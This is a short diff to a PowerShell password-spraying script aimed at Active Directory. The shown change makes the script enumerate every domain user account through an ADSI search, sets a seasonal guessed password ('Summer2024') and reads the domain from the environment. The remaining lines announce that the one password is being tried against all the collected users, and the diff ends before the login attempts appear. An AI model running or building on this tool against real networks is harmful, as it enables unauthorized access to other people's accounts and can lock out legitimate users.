@@ -1,6 +1,9 @@
-$userlist = Get-content "C:\users\bob\desktop\userlist.txt"
-$password = "Sommer2020"
-$Domain ="domain.local"
+$search = [adsisearcher]"(&(samAccountType=805306368))"
+$search.PageSize = 10000
+$users = $search.FindAll()
+$userlist = $users | % { $_.properties['samaccountname']}
+$password = "Summer2024"
+$Domain = $env:userdnsdomain
 $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
 $count = $UserList.count
 Write-Host "[*] Now trying password $password against $count users."
